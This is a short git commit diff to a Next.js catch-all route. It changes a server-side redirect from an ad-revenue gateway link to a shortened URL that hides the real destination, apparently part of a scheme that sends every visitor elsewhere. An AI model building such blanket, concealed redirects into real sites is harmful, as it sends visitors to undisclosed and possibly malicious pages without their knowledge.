2dc42e68b1f38395ab36580438c6973b080c059c
Sbrety <133106027+Sbrety@users.noreply.github.com>
2023-05-29 15:34:49 +0530

    Update [...postpath].tsx

--- pages/[...postpath].tsx
+++ pages/[...postpath].tsx
@@ -18,7 +18,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://www.highrevenuegate.com/ky77i8tfw8?key=871352439333722088cbb27b6f0c86bc`
+					`https://shorturl.at/otL48`
 				}`,
 			},
 		};
